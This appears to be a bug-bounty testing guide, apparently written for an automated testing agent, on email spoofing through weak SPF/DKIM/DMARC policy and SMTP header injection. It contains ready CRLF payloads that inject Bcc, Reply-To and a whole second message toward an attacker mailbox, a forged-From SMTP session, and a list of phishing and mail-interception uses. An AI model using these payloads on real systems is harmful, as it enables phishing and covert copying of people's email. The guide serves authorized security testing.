# Email Spoofing / SMTP Injection — Vulnerability Skill

**Phase:** 3 | **Skill Type:** Testing | **Impact:** Medium/High | **Prerequisite:** Target domain mapped (Phase 0/2), email-related app features identified (contact forms, notifications, password resets, invitations, file sharing)

---

## Mental Model

Two distinct bugs live here — don't conflate them:

**A. Email Spoofing (domain-level).** The email infrastructure *intentionally* allows forged `From` addresses because SPF/DKIM/DMARC are missing or misconfigured. Attacker sends mail as `ceo@target.com` and receiving servers accept it. This is about *the domain's mail policy*, not the app.

**B. SMTP/Header Injection (app-level).** The application composes an email from user-controlled fields (From, To, Subject, body, CC) and concatenates them into the raw SMTP message/`MAIL FROM` without stripping CR/LF. An attacker injects `\r\n` to add headers (Bcc, Reply-To), recipients, or even a *complete second email* (`\r\n.\r\n` body termination).

**The core assumption you're violating:**
- (A) "DMARC is hard, we'll add it later" — a *none* or *missing* DMARC policy with no aligned SPF/DKIM means anyone can spoof.
- (B) "The email library sanitizes the fields for me" — libraries escape HTML, not SMTP protocol newlines.

**Why receiving-server checks matter (the spoofing math):**
- `Mail-From` (envelope) is checked against **SPF**.
- The signing domain must match the From domain for **DKIM alignment**.
- **DMARC** decides what receivers *do* with fails: `reject` (block), `quarantine` (spam), `none` (accept, just report). Only `reject`/`quarantine` (with high `pct`) actually prevent spoofing.

---

## Phase 1: OOB-First Detection (MANDATORY)

OOB works for the app-level injection (your OOB-capable mailbox is the "victim receiver"), and a controlled sender tests the domain policy.

```bash
./tools/interactsh_launcher.sh start --output-dir engagement/oob/
OOB_URL=$(cat engagement/oob/oob_url.txt)
```

### 1.1 SMTP Injection → OOB mailbox (app-level)
In every user-controlled email field, inject a `Bcc` to a mailbox you control (your OOB/attacker inbox, NOT interactsh — it doesn't receive mail):

```bash
# Contact form / notification trigger fields
curl -X POST https://target.com/contact \
  -d "name=test&email=test@test.com%0d%0aBcc: attacker@attacker-mailbox.com&message=hello"
curl -X POST https://target.com/share \
  -d "recipient=victim@company.com%0d%0aCc: attacker@attacker-mailbox.com&note=hi"
```

If attacker@attacker-mailbox.com receives a copy of the email → header injection confirmed. CONFIRMED. Skip to Phase 4.

### 1.2 Spoofing test (domain-level)
Send a test email as `admin@target.com` from an external (non-target) mail server you control, addressed to a mailbox you can read, then check headers.

```bash
openssl s_client -connect smtp.attacker-provider.com:25 -starttls smtp <<'EOF'
EHLO test
MAIL FROM:<attacker@yourdomain.com>
RCPT TO:<your-mailbox@provider.com>
DATA
From: admin@target.com
To: your-mailbox@provider.com
Subject: [Authorized Test] SPF/DMARC probe
Body.
.
QUIT
EOF
```

Inspect the delivered headers: `Authentication-Results` will show `spf=fail`, `dkim=fail`, and the DMARC disposition (`none` vs `reject`).

---

## Phase 2: Confirmation

### 2.1 DNS Policy Assessment (domain-level — do this FIRST, it's free)

```bash
# SPF
dig +short TXT target.com
dig +short TXT _spf.target.com
# DMARC
dig +short TXT _dmarc.target.com
# MX
dig +short MX target.com
# DKIM selectors (common ones)
for s in default google s1 k1 selector1 mail; do
  dig +short TXT "$s._domainkey.target.com"
done
```

**Interpretation table:**

| SPF | DMARC | Verdict |
|-----|-------|---------|
| `v=spf1 -all` (hard fail) + aligned DKIM | `p=reject` | Strong — likely not spoofable |
| `v=spf1 -all` | `p=quarantine` | Partially protected |
| `v=spf1 ?all` / missing / permissive `include` | `p=none` or missing | **Spoofable — report it** |
| None (no SPF record) | None | **Spoofable — report it** |

Check `pct=` and `sp=` too — a `p=reject; pct=0` is "reject" on paper but enforces 0%.

### 2.2 Live Spoof Verification

```bash
# Use a service or a scripted SMTP send from an external server
# Verify with a mailbox you control:
#  1. From header: admin@target.com (spoofed)
#  2. Authentication-Results: spf=fail / dkim=none / dmarc=... disposition
```

**Confirmation criteria:** mail lands in the **Inbox** (not spam quarantine) with a forged From that the receiving server accepted → spoofing is real and effective.

### 2.3 SMTP Header Injection (app-level) — field-by-field

Test EVERY user-controlled field in every email-producing feature:

```bash
# Header injection (add headers)
email=victim@x.com%0d%0aBcc:%20attacker@attacker-mailbox.com
email=victim@x.com%0d%0aReply-To:%20attacker@attacker-mailbox.com
subject=Hi%0d%0aBcc:%20attacker@attacker-mailbox.com
name=Bob%0d%0aTo:%20attacker@attacker-mailbox.com

# Recipient injection (multiple To)
email=a@b.com%0d%0aTo:%20attacker@attacker-mailbox.com

# Body termination + new message (full second email)
message=hello%0d%0a.%0d%0aFrom:%20attacker@attacker-mailbox.com%0d%0aTo:%20victim@company.com%0d%0aSubject:%20fake%0d%0a%0d%0aInjected%20body%0d%0a.%0d%0a
```

Confirm by checking the delivered mail in your attacker mailbox for the injected headers/recipients.

### 2.4 Direct-To-MX Injection

If the app has an endpoint that relays arbitrary SMTP (feedback/notify), test whether you can send **from** `admin@target.com` through it:

```bash
# Some apps accept MAIL FROM + RCPT TO and relay
curl -X POST https://target.com/api/sendmail \
  -d "from=admin@target.com&to=victim@company.com&subject=Hi&body=Hello"
```

If the delivered mail shows the relay's server accepted an unauthenticated spoofed From → report.

---

## Phase 3: Negative Verdict (MANDATORY GATE)

**DO NOT declare email spoofing negative without:**

1. Checking ALL of: SPF, DMARC, MX, and common DKIM selectors — one DNS record can be absent while others exist
2. Reading the DMARC *policy* (`p=reject` vs `p=none`/`quarantine`) AND `pct` — not just record presence
3. Confirming SPF is enforced (`-all`), not permissive (`?all`/`~all` counts as weak)
4. Sending an actual test mail (policy records are advisory; the receiving server's behavior is the truth)
5. Checking DMARC `sp=` for subdomains (subdomains may be spoofable even if apex is protected)

**DO NOT declare SMTP injection negative without:**

1. Testing every email field on every email-generating feature
2. Testing all encodings: `%0d%0a`, `%0a`, raw `\r\n` in JSON bodies, `%0d%0a%0d%0a`
3. Confirming via the delivered mail in your attacker mailbox — response codes alone can't show injected headers
4. Testing Bcc, Cc, To, Reply-To, Subject, and body-termination separately

If policy is strong (SPF hard-fail + DMARC reject + aligned DKIM) AND no field accepts injection → NEGATIVE.

---

## Phase 4: Exploitation

### 4.1 Spoofing Impact (domain-level)
- Forge `From: support@target.com` phishing — credibility of a trusted domain
- Malware/social-engineering delivery with the victim's own domain in the From
- **Note:** many bug bounty programs reject pure SPF/DMARC findings — check the program scope; if accepted, document the Authentication-Results proof carefully

### 4.2 SMTP Injection Impact (app-level)
- **Mailbox poisoning:** inject `Bcc`/`Cc` to silently receive copies of victim emails
- **Full email control:** inject a complete second message (body termination) for phishing inside the app's mail stream
- **Reply-To hijack:** poison `Reply-To` so replies to a legit app email go to the attacker
- **Domain pivot:** if the app relays with its own domain, spoof `From` *through* the app — the mail passes SPF/DKIM because the *app's* server sends it (this is the highest-value escalation)

### 4.3 Proof Package
- For spoofing: delivered mail headers showing `spf=fail` / DMARC disposition + Inbox placement
- For injection: attacker mailbox copy showing the injected `Bcc:`/second body

**Stop condition:** First successful spoof/injection delivery to a controlled mailbox. Document and stop — do NOT spam or phish real users.

---

## What You DO
- Query SPF, DMARC, MX, DKIM selectors before any sending — the DNS tells you where to look
- Verify policy *enforcement* with a real test mail — records are advisory
- Test SMTP injection on every user-controlled email field, every encoding
- Confirm app-level findings by inspecting the delivered message in a mailbox you control
- Check for the app acting as a spoofing relay (From injection through the app's own mail server)

## What You DO NOT Do
- Conflate missing SPF with "spoofable" — DMARC `reject` + aligned DKIM still blocks spoofing
- Conflate DMARC `none` with protected — `none` literally means "accept spoofs"
- Send spoofed mail to real target employees — only to your own controlled mailbox
- Rely on HTTP responses to confirm SMTP injection — check the delivered email
- Assume a spoofing finding pays — read the program scope; some programs explicitly exclude SPF/DMARC issues

---

## Cross-Skill Links
- [[host-header-injection]] — Password-reset email URLs often derive from the Host header; combine for token theft
- [[bfla]] — Admin functions that send bulk email amplify injection impact
- [[xss]] — Injected email HTML can carry a phishing/XSS vector to recipients
